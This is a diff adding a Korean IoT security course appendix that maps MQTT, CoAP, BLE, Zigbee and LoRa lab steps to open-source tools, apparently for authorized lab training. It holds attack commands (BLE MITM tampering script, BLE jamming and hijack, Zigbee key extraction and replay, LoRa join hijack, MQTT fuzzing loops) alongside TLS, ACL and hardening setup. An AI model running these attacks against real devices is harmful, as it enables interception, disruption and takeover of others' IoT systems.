@@ -478,3 +478,556 @@ graph LR
 
 **학생 액션**: lab firmware analyze.
 
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course17 IoT Security — Week 02 IoT 네트워크 프로토콜·BLE·Zigbee·LoRa·MQTT TLS·퍼징)
+
+> 이 부록은 본문 Part 3-5 의 5 lab (MQTT broker 모니터링 / MQTT 가로채기 /
+> MQTT 인증 / CoAP server-client / 프로토콜 퍼징 / MQTT TLS / ACL) 의 모든
+> 명령을 *실제 OSS 도구* 시퀀스로 매핑한다. w01 부록과 중복 피하기 위해
+> *프로토콜별 심화 도구* (BLE → bluepy/gattacker/btlejack, Zigbee →
+> killerbee/Zigbee2MQTT, LoRa → chirpstack/LoRaWAN-MAC) + *프로토콜 퍼징
+> framework* (boofuzz / radamsa / AFL++) + *MQTT TLS 운영 자동화* (step-ca
+> + cert-manager) + *6LoWPAN / 802.15.4* 까지 포괄한다.
+
+### lab step → 도구 매핑 표
+
+| step | 본문 위치 | 학습 항목 | 본문 명령 | 핵심 OSS 도구 (실 명령) | 도구 옵션 |
+|------|----------|----------|----------|-------------------------|-----------|
+| s1 | 3.1 | MQTT broker (anonymous) | `mosquitto -c /dev/null -p 1883 -v` | mosquitto / EMQX (w01 부록) | `-v` verbose |
+| s2 | 3.1 | 센서 데이터 시뮬 | `mosquitto_pub -t factory/sensor/$i/temp` | mqtt-cli / paho-mqtt + asyncio | 다중 토픽 |
+| s3 | 3.2 | 메시지 가로채기 | `mosquitto_sub -t '#'` | MQTT-PWN / mqtt-spy GUI | wildcard |
+| s4 | 3.2 | 악성 메시지 주입 | `mosquitto_pub -t factory/actuator/valve` | paho-mqtt automation | impersonation |
+| s5 | 3.3 | MQTT 인증 | `mosquitto_passwd -c` | mosquitto-go-auth / Vault dynamic | LDAP / DB backend |
+| s6 | 4.1 | CoAP Observable | aiocoap ObservableResource | libcoap (server) / Californium | OBSERVE option |
+| s7 | 4.2 | tcpdump MQTT | `tcpdump -i any port 1883 -w` | tshark + MQTT dissector / scapy | bit-level |
+| s8 | 4.3 | MQTT 퍼징 | Python socket struct | boofuzz / radamsa / AFL++ / scapy fuzz | framework |
+| s9 | 5.1 | MQTT TLS | openssl req + mosquitto.conf | step-ca / cert-manager / certbot | 자동 갱신 |
+| s10 | 5.2 | MQTT ACL | mosquitto_acl.conf | mosquitto-go-auth (DB) / EMQX rule engine | dynamic |
+| s11 | 1.4 BLE | BLE GATT | (이론) | bluepy / gattacker / btlejack / bleah / hcitool / nRF Connect | scan + GATT |
+| s12 | 1.5 Zigbee | Zigbee 캡처 | (이론) | killerbee / Zigbee2MQTT / wireshark zigbee dissector | sniff |
+| s13 | 1.6 LoRa | LoRaWAN | (이론) | chirpstack-server / LoRaWAN-MAC-NodeJS / lorabridge | network server |
+
+### 무선 / 메시지 프로토콜 도구 매트릭스 (5 layer)
+
+| Layer / 프로토콜 | 카테고리 | OSS 도구 | 비고 |
+|------------------|---------|----------|------|
+| **WiFi (802.11)** | scan / attack | aircrack-ng / wifite / kismet | course16 w06 부록 |
+| **BLE 4.x** | scan + GATT | bluepy / hcitool / gatttool | classical |
+| **BLE 4.x** | exploit | gattacker / bleah / btlejack | passive crack |
+| **BLE 5.x** | secure pairing | bluez (5.65+) / nRF Connect Desktop | 인증서 |
+| **Zigbee** | sniff | killerbee + atmel raven / Apimote | 802.15.4 |
+| **Zigbee** | network 분석 | Zigbee2MQTT / wireshark Zigbee | mesh |
+| **Zigbee** | exploit | killerbee zbgoodfind / zbstumbler | network key 탈취 |
+| **Z-Wave** | network | OpenZWave / Z-Wave-JS / zwave-js-server | smart home |
+| **Z-Wave** | exploit | EZ-Wave (RFCat) | 868/908MHz |
+| **LoRa** | end-device | LoRaWAN-MAC-NodeJS / RAK 보드 + Python | chip lib |
+| **LoRa** | gateway | chirpstack-network-server / chirpstack-app-server | full stack |
+| **LoRa** | exploit | LoRaPWN / lorawan-attacks | replay / join hijack |
+| **NB-IoT** | network | open5GS / srsRAN | LTE-M / NB-IoT |
+| **6LoWPAN** | IPv6 over 802.15.4 | contiki-ng / Riot OS / Tinyos | embedded IPv6 |
+| **MQTT broker** | broker | mosquitto / EMQX / HiveMQ CE | w01 부록 |
+| **MQTT auth** | auth backend | mosquitto-go-auth (LDAP/MySQL) / EMQX plugin | dynamic auth |
+| **MQTT TLS** | cert mgmt | step-ca / cert-manager / certbot | 자동 갱신 |
+| **MQTT 퍼징** | malformed | boofuzz / radamsa / scapy fuzz / mqtt-fuzzer | framework |
+| **CoAP** | server / client | aiocoap / libcoap / Californium | Java/Py/C |
+| **CoAP DTLS** | TLS over UDP | libcoap + tinydtls / Californium DTLS | PSK / cert |
+| **CoAP 퍼징** | malformed | boofuzz / coap-fuzzer | framework |
+| **AMQP** | broker (lab) | RabbitMQ / Apache Qpid / ActiveMQ | enterprise |
+| **Modbus / OPC-UA** | OT | modbus-cli / open62541 (OPC-UA) | OT 보안 |
+
+### 학생 환경 준비
+
+```bash
+# attacker VM (w01 보강 — 무선 + 퍼징 도구 추가)
+sudo apt-get update
+sudo apt-get install -y \
+   bluez bluez-tools bluez-hcidump python3-bluez \
+   wireshark-common tshark \
+   openssl ca-certificates \
+   socat ncat \
+   python3-pip
+
+# BLE 도구
+pip3 install --user bluepy bleak pygatt
+git clone https://github.com/securing/gattacker /tmp/gattacker
+cd /tmp/gattacker && npm install
+
+# btlejack (BLE 5.0 sniffer + jammer)
+pip3 install --user btlejack
+
+# bleah (BLE recon)
+pip3 install --user bleah
+
+# Zigbee — killerbee
+git clone https://github.com/riverloopsec/killerbee /tmp/killerbee
+cd /tmp/killerbee && pip3 install --user -e .
+
+# Zigbee2MQTT (운영 zigbee → mqtt bridge)
+git clone https://github.com/Koenkk/zigbee2mqtt /tmp/zigbee2mqtt
+cd /tmp/zigbee2mqtt && npm install
+
+# Z-Wave-JS (Z-Wave server)
+npm install -g @zwave-js/server
+
+# chirpstack (LoRaWAN full stack — docker)
+git clone https://github.com/brocaar/chirpstack-docker /tmp/chirpstack
+cd /tmp/chirpstack && docker compose up -d
+
+# 퍼징 framework
+pip3 install --user boofuzz scapy
+sudo apt-get install -y radamsa afl++
+
+# step-ca (MQTT TLS 자동 인증서)
+curl -sLo /tmp/step-ca.deb \
+   https://github.com/smallstep/certificates/releases/latest/download/step-ca_0.27.5_amd64.deb
+sudo dpkg -i /tmp/step-ca.deb
+
+# step CLI
+curl -sLo /tmp/step-cli.deb \
+   https://github.com/smallstep/cli/releases/latest/download/step-cli_0.27.5_amd64.deb
+sudo dpkg -i /tmp/step-cli.deb
+
+# mosquitto-go-auth (DB-based auth plugin)
+git clone https://github.com/iegomez/mosquitto-go-auth /tmp/mosq-go-auth
+cd /tmp/mosq-go-auth && make
+
+# 검증
+hcitool --version 2>&1 | head -1
+bluetoothctl --version
+btlejack -v 2>&1 | head -1
+zbstumbler -h 2>&1 | head -3 || echo "killerbee 인터페이스 필요"
+boofuzz --version 2>&1 | head -1
+radamsa --version
+step --version | head -1
+step-ca --version | head -1
+docker ps | grep chirpstack
+```
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: bluepy / hcitool — BLE 디바이스 GATT scan (s11)
+
+본문 1.4 *BLE GATT 아키텍처* 의 실 도구. Linux bluez stack + Python bluepy
+로 GATT scan / read / write / notify 모두 가능.
+
+```bash
+# 1. BLE adapter 확인
+hciconfig
+# hci0:   Type: Primary  Bus: USB
+#         BD Address: AA:BB:CC:11:22:33  ACL MTU: 1021:8
+#         UP RUNNING
+
+# 2. BLE 디바이스 scan (10초)
+sudo hcitool lescan --duplicates &
+sleep 10 && sudo killall hcitool
+# 11:22:33:44:55:66 (unknown)
+# 11:22:33:44:55:66 Mi Band 5
+# AA:BB:CC:11:22:33 ESP32-Sensor
+
+# 3. Python bluepy (GATT scan + read)
+python3 << 'PY'
+from bluepy.btle import Scanner, DefaultDelegate, Peripheral, ADDR_TYPE_RANDOM
+
+class ScanDelegate(DefaultDelegate):
+    def handleDiscovery(self, dev, isNewDev, isNewData):
+        if isNewDev:
+            print(f"[+] {dev.addr} ({dev.addrType}) RSSI={dev.rssi}")
+            for ad_type, desc, value in dev.getScanData():
+                print(f"    {desc}: {value}")
+
+scanner = Scanner().withDelegate(ScanDelegate())
+devices = scanner.scan(10.0)
+
+# 첫 발견 디바이스 GATT 분석
+if devices:
+    dev = list(devices)[0]
+    print(f"\n[*] Connecting to {dev.addr}...")
+    p = Peripheral(dev.addr, addrType=dev.addrType)
+    for svc in p.getServices():
+        print(f"  Service: {svc.uuid}")
+        for ch in svc.getCharacteristics():
+            props = ch.propertiesToString()
+            try:
+                val = ch.read() if 'READ' in props else b''
+            except Exception:
+                val = b'(no read)'
+            print(f"    Char: {ch.uuid} [{props}] value={val.hex() if val else '-'}")
+    p.disconnect()
+PY
+
+# 4. gatttool (인터랙티브)
+sudo gatttool -b AA:BB:CC:11:22:33 -I
+[AA:BB:CC:11:22:33][LE]> connect
+[AA:BB:CC:11:22:33][LE]> primary
+[AA:BB:CC:11:22:33][LE]> characteristics
+[AA:BB:CC:11:22:33][LE]> char-read-hnd 0x0010
+[AA:BB:CC:11:22:33][LE]> char-write-req 0x0014 1234
+
+# 5. bleah (BLE 종합 recon)
+sudo bleah -b "AA:BB:CC:11:22:33" -e
+# 모든 service + characteristic + value 한 번에
+
+# 6. nRF Connect for Mobile (Android — 학습용 공식 GUI)
+# Google Play 에서 설치 — BLE 최고 GUI
+```
+
+#### 도구 2: gattacker — BLE MITM (s11)
+
+GATT 트래픽을 가로채고 변조. central / peripheral 사이 proxy.
+
+```bash
+# gattacker workflow (Node.js)
+cd /tmp/gattacker
+
+# 1. central 측 (디바이스 응답)
+node ws-slave.js
+# 진짜 BLE 디바이스에 연결 → 모든 GATT 응답 캡처
+
+# 2. peripheral 측 (스마트폰 측 — 가짜 디바이스 발행)
+node advertise.js targetdevice.adv.json
+# 가짜 BLE 디바이스 advertise → 스마트폰이 연결
+
+# 3. 트래픽 변조 (script)
+cat << 'JS' > scripts/temperature_modify.js
+exports.processWrite = function(handle, data) {
+    if (handle === 0x0014) {
+        console.log("[!] Modifying temperature setting");
+        return Buffer.from([0xFF, 0xFF, 0xFF]);  // 변조
+    }
+    return data;
+};
+JS
+node ws-slave.js scripts/temperature_modify.js
+```
+
+#### 도구 3: btlejack — BLE 5.0 sniffer + jammer (s11)
+
+BLE 4.0/5.0 의 connection / hopping pattern 추적. micro:bit 보드 필요
+($15).
+
+```bash
+# 1. micro:bit 펌웨어 flash
+btlejack -f
+# Flashing micro:bit firmware...
+# Done
+
+# 2. BLE advertise scan
+btlejack -s
+# [+] AA:BB:CC:11:22:33 (RSSI: -45) Mi Band
+
+# 3. specific device 추적
+btlejack -f AA:BB:CC:11:22:33 -t 30
+# [+] 35 connection events captured
+
+# 4. jamming (lab 한정)
+btlejack -j -t AA:BB:CC:11:22:33
+
+# 5. Hijack (advanced)
+btlejack -f AA:BB:CC:11:22:33 -j -h
+# → 능동 hijack — 진짜 central 자리 차지
+```
+
+#### 도구 4: killerbee — Zigbee 보안 (s12)
+
+본문 1.5 *Zigbee 네트워크 키 평문* / *기본 Trust Center Link Key
+(ZigBeeAlliance09)* 의 실 도구. Atmel Raven 또는 Apimote dongle 필요.
+
+```bash
+# 1. Zigbee 인터페이스 확인
+zbid
+# Dev   Product String      Serial Number
+# 1:5   AVR Raven           Apimote v3
+
+# 2. 채널 scan (Zigbee 11-26)
+zbstumbler -i 1:5
+# Channel 11: BTU3LR PAN 0x1234
+# Channel 15: Hue Bridge PAN 0xABCD
+
+# 3. 패킷 캡처 (특정 채널)
+zbdump -f 15 -w /tmp/zigbee.pcap
+
+# 4. wireshark 로 .pcap 분석 (Zigbee dissector)
+wireshark /tmp/zigbee.pcap
+# Filter: zbee_nwk
+
+# 5. network key 탐색 (구형 — 평문 join 캡처)
+zbgoodfind -d /tmp/zigbee.pcap -f /tmp/keys.txt
+
+# 6. join 시 trust center key 검색
+zbreplay -f 15 -r /tmp/zigbee.pcap -j
+
+# 7. Zigbee2MQTT (방어 — Zigbee mesh 를 MQTT 로 통합)
+docker run -d --name zigbee2mqtt \
+   -v /opt/zigbee2mqtt/data:/app/data \
+   -v /run/udev:/run/udev:ro \
+   --device=/dev/ttyACM0 \
+   -e TZ=Asia/Seoul \
+   koenkk/zigbee2mqtt
+```
+
+#### 도구 5: chirpstack + LoRaWAN — LoRa 전체 스택 (s13)
+
+본문 1.6 *LoRaWAN: NwkSKey + AppSKey + AppKey* 의 실 lab. chirpstack 는
+network server + application server + gateway bridge 통합.
+
+```bash
+# 1. chirpstack docker compose
+cd /tmp/chirpstack && docker compose up -d
+# 서비스:
+#   chirpstack-gateway-bridge:1700  (gateway → MQTT)
+#   chirpstack:8080                  (network + app server)
+#   redis:6379, postgresql:5432, mosquitto:1883
+
+# 2. Web UI
+firefox http://localhost:8080
+# admin / admin
+
+# 3. workflow:
+#   a. Network server 추가
+#   b. Service profile 생성
+#   c. Application 생성
+#   d. Device profile (regional band — 한국 KR920 / 유럽 EU868 / 미국 US915)
+#   e. End device 등록 (DevEUI / AppKey)
+
+# 4. 가상 LoRa device (Python — chirpstack-simulator)
+git clone https://github.com/brocaar/chirpstack-simulator /tmp/cs-sim
+cd /tmp/cs-sim && go build -o /usr/local/bin/chirpstack-simulator ./cmd/chirpstack-simulator
+chirpstack-simulator --service-profile-id $SP_ID
+
+# 5. LoRaWAN 보안 키 학습
+# - DevEUI:  64-bit device 식별자 (MAC 주소 등가)
+# - AppEUI:  64-bit app 식별자
+# - AppKey:  128-bit OTAA 활성화 키 (사전 공유)
+# - NwkSKey: 128-bit 세션 키 (네트워크 — 무결성 MAC)
+# - AppSKey: 128-bit 세션 키 (애플리케이션 — 페이로드 암호화)
+
+# 6. LoRaWAN 공격 시뮬 (lab)
+git clone https://github.com/IOActive/lorapwn /tmp/lorapwn
+# - Join Hijack (AppKey 탈취 시)
+# - Replay attack (counter 미리 캡처)
+# - DevAddr collision DoS
+
+# 7. 방어 — chirpstack 의 frame_counter_validation 강제
+# - Strict frame counter check (replay 차단)
+# - LoRaWAN 1.1 (forward / backward 키 분리)
+```
+
+#### 도구 6: boofuzz — 프로토콜 퍼징 framework (s8)
+
+본문 4.3 의 *MQTT 퍼징* (Python socket + struct) 의 *완성형*. boofuzz
+는 Sulley 의 후속 — 상태 기반 fuzzing + crash detection + restart hook.
+
+```python
+#!/usr/bin/env python3
+# /tmp/mqtt-boofuzz.py — MQTT broker 본격 퍼징
+from boofuzz import *
+
+# 1. session
+session = Session(
+    target=Target(connection=TCPSocketConnection("10.20.30.80", 1883)),
+    sleep_time=0.1,
+    crash_threshold_request=3,
+)
+
+# 2. MQTT CONNECT 패킷 정의
+s_initialize("mqtt_connect")
+# Fixed header
+s_byte(0x10, name="msg_type")           # CONNECT (0x10)
+s_size("payload", length=1, name="remaining_len", fuzzable=True)
+# Variable header
+if s_block_start("payload"):
+    s_word(0x0004, name="proto_name_len", endian=">")
+    s_string("MQTT", name="proto_name", fuzzable=True)
+    s_byte(0x05, name="proto_level", fuzzable=True)
+    s_byte(0xc0, name="connect_flags", fuzzable=True)
+    s_word(0x003c, name="keep_alive", endian=">", fuzzable=True)
+    # Properties (MQTTv5)
+    s_byte(0x00, name="prop_len")
+    # Payload
+    s_word(0x000a, name="client_id_len", endian=">")
+    s_string("fuzz_client", name="client_id", fuzzable=True)
+s_block_end("payload")
+
+# 3. 세션 등록
+session.connect(s_get("mqtt_connect"))
+
+# 4. 실행 (모든 mutation 자동)
+session.fuzz()
+
+# 5. 결과 — boofuzz_results.db (sqlite)
+# crash 발견 시 자동 restart + 로그
+PY
+
+python3 /tmp/mqtt-boofuzz.py
+
+# 6. radamsa (단순 일반화 fuzz)
+echo -ne '\x10\x0c\x00\x04MQTT\x05\xc0\x00\x3c\x00\x00' \
+   | radamsa -n 100 \
+   | while read -d '' mutated; do
+       echo -n "$mutated" | nc -w 2 10.20.30.80 1883
+   done
+
+# 7. AFL++ (binary fuzzing — broker 실행파일 직접)
+afl-fuzz -i /tmp/seeds/mqtt -o /tmp/afl-out \
+   -- /usr/sbin/mosquitto -c /etc/mosquitto/test.conf
+```
+
+#### 도구 7: step-ca — MQTT TLS 자동 인증서 (s9)
+
+본문 5.1 의 openssl 자체 서명 → step-ca 자동 발급 + 자동 갱신. 운영
+환경 표준.
+
+```bash
+# 1. CA 초기화
+step ca init \
+   --name "IoT-CA" \
+   --dns "ca.lab.local" \
+   --address ":8443" \
+   --provisioner admin@lab.local
+
+# 2. CA 시작
+step-ca $(step path)/config/ca.json &
+
+# 3. broker 인증서 발급 (자동)
+step ca certificate "mqtt-broker.lab.local" \
+   /tmp/server.crt /tmp/server.key \
+   --provisioner admin@lab.local
+
+# 4. 클라이언트 인증서 (mTLS)
+step ca certificate "sensor-001" \
+   /tmp/sensor-001.crt /tmp/sensor-001.key
+
+# 5. mosquitto.conf — mTLS 강제
+cat << 'EOF' > /tmp/mosquitto-mtls.conf
+listener 8883
+cafile /etc/mosquitto/certs/root_ca.crt
+certfile /etc/mosquitto/certs/server.crt
+keyfile /etc/mosquitto/certs/server.key
+require_certificate true               # mTLS — 클라이언트 인증서 필수
+use_identity_as_username true          # 인증서 CN 을 username 으로
+allow_anonymous false
+EOF
+
+# 6. 클라이언트 mTLS 접속
+mosquitto_pub \
+   --cafile $(step path)/certs/root_ca.crt \
+   --cert /tmp/sensor-001.crt \
+   --key /tmp/sensor-001.key \
+   -h mqtt-broker.lab.local -p 8883 \
+   -t 'home/sensor/temp' -m '25.3'
+
+# 7. 자동 갱신 (cron)
+echo "0 3 * * * step ca renew /etc/mosquitto/certs/server.crt /etc/mosquitto/certs/server.key --force --exec 'systemctl restart mosquitto'" \
+   | crontab -
+```
+
+#### 도구 8: mosquitto-go-auth — DB 기반 동적 ACL (s10)
+
+본문 5.2 정적 ACL → DB / Redis / LDAP 동적 인증. 사용자 추가 시 broker
+재시작 불필요.
+
+```bash
+# 1. mosquitto-go-auth plugin 설치
+cd /tmp/mosq-go-auth && make
+sudo install -m755 go-auth.so /usr/lib/mosquitto/
+
+# 2. PostgreSQL DB 준비 (사용자 + ACL)
+sudo -u postgres psql << EOF
+CREATE DATABASE mqtt_auth;
+\c mqtt_auth
+CREATE TABLE accounts (
+    username text PRIMARY KEY,
+    password_hash text NOT NULL,
+    is_admin boolean DEFAULT false
+);
+CREATE TABLE acls (
+    id serial PRIMARY KEY,
+    username text REFERENCES accounts(username),
+    topic text NOT NULL,
+    rw integer NOT NULL  -- 1=read, 2=write, 3=both
+);
+
+INSERT INTO accounts VALUES ('alice', crypt('alice123', gen_salt('bf')), false);
+INSERT INTO acls (username, topic, rw) VALUES
+    ('alice', 'home/+/temperature', 3),
+    ('alice', 'home/status', 1);
+EOF
+
+# 3. mosquitto.conf
+cat << 'EOF' >> /etc/mosquitto/mosquitto.conf
+auth_plugin /usr/lib/mosquitto/go-auth.so
+auth_opt_backends postgres
+auth_opt_pg_host 127.0.0.1
+auth_opt_pg_dbname mqtt_auth
+auth_opt_pg_user postgres
+auth_opt_pg_password postgres
+auth_opt_pg_userquery SELECT password_hash FROM accounts WHERE username = $1
+auth_opt_pg_aclquery SELECT topic FROM acls WHERE username = $1 AND rw >= $2
+EOF
+
+sudo systemctl restart mosquitto
+
+# 4. 동적 사용자 추가 (DB INSERT 만으로 즉시 반영)
+sudo -u postgres psql -d mqtt_auth -c "
+INSERT INTO accounts VALUES ('bob', crypt('bob123', gen_salt('bf')), false);
+INSERT INTO acls (username, topic, rw) VALUES ('bob', 'home/+/+', 1);"
+
+# 5. 즉시 검증 (broker 재시작 없이)
+mosquitto_sub -h localhost -u bob -P bob123 -t 'home/+/+'
+```
+
+### 프로토콜별 공격 / 방어 매트릭스
+
+| 프로토콜 | 1차 공격 | 1차 방어 |
+|---------|----------|----------|
+| **MQTT (anonymous)** | mqtt-pwn / paho-mqtt sub '#' | allow_anonymous false |
+| **MQTT (basic auth)** | hydra / mqtt-pwn brute | mosquitto-go-auth + bcrypt |
+| **MQTT (no TLS)** | tshark + grep cred | TLS 8883 + step-ca |
+| **MQTT (broad ACL)** | mqtt-pwn topic enum | ACL per-user per-topic |
+| **MQTT (퍼징)** | boofuzz / radamsa | rate limit + size limit |
+| **CoAP (NoSec)** | coap-client / aiocoap | DTLS + PSK |
+| **CoAP (DTLS-PSK)** | (PSK 누출 시 동일) | Cert-based DTLS |
+| **BLE (Just Works)** | gattacker / bleah | LE Secure Conn (LESC) |
+| **BLE (Legacy pairing)** | crackle (offline crack) | LESC ECDH |
+| **Zigbee (default key)** | killerbee zbgoodfind | unique install code |
+| **Zigbee (replay)** | zbreplay | frame counter check |
+| **LoRa (replay)** | lorapwn replay | strict counter validation |
+| **LoRa (join hijack)** | lorapwn (AppKey 탈취 시) | LoRaWAN 1.1 + HSM |
+| **6LoWPAN** | scapy + RPL exploit | secure RPL + IPv6 firewall |
+
+### 학생 자가 점검 체크리스트
+
+- [ ] 본문 mqtt-vulnerable broker → mqtt-secure (인증 + ACL) 마이그레이션 1회
+- [ ] step-ca 로 자체 CA 생성 + broker / 클라이언트 인증서 발급 + mTLS 1회
+- [ ] mosquitto-go-auth + PostgreSQL 동적 ACL 1회 (사용자 add 즉시 반영)
+- [ ] bluepy 또는 hcitool 로 BLE 디바이스 GATT scan + read 1회
+- [ ] killerbee 로 Zigbee 채널 scan + .pcap 캡처 (또는 simulator)
+- [ ] chirpstack docker 부팅 + Web UI 접근 + 가상 device 등록 1회
+- [ ] boofuzz 로 MQTT CONNECT 패킷 fuzzing 1회 + crash 발견 시 분석
+- [ ] tshark MQTT / CoAP 캡처에서 평문 cred 직접 추출 (TLS 미적용 시)
+- [ ] BLE / Zigbee / LoRa / Z-Wave 4 프로토콜의 *주파수 / 보안 / 공격* 답변 가능
+- [ ] 본 부록 모든 명령에 대해 "외부 디바이스 적용 시 위반 법조항" 답변 가능
+
+### 운영 환경 적용 시 주의
+
+1. **MQTT 평문 1883 즉시 차단** — 운영 broker 는 8883 (TLS) + 인증 + ACL.
+   1883 listen 자체 비활성.
+2. **BLE LESC 강제** — Just Works / Legacy pairing 차단. LESC (LE Secure
+   Connections) ECDH 만 허용.
+3. **Zigbee install code 의무** — default ZigBeeAlliance09 키 사용 금지.
+   각 디바이스 unique install code (16-byte 랜덤) 사용.
+4. **LoRaWAN 1.1 마이그** — LoRaWAN 1.0.x 의 join 공격 위험 → 1.1 (forward
+   / backward key 분리) + HSM 보관.
+5. **퍼징 격리** — boofuzz / AFL++ 는 broker crash 유발. 반드시 lab 격리
+   환경 한정. 운영 broker 절대 금지.
+6. **TLS 인증서 자동 갱신** — step-ca + cron 으로 90일 갱신. 만료 시 모든
+   IoT 통신 중단 위험.
+7. **프로토콜 인벤토리** — 회사 IoT 의 *모든 프로토콜 (MQTT/CoAP/BLE/Zigbee/
+   LoRa)* 자산 inventory + 보안 등급 분기 audit.
+
+> 본 부록은 *학습 시연용 OSS 시퀀스* 이다. 모든 무선 / 메시지 프로토콜
+> 공격은 *허가된 lab + RF 격리 + 본인 자산* 한정. 외부 BLE / Zigbee /
+> LoRa 디바이스 한 packet 도 송신 시 전파법 §29 + 통신비밀보호법 §3.
+
+---
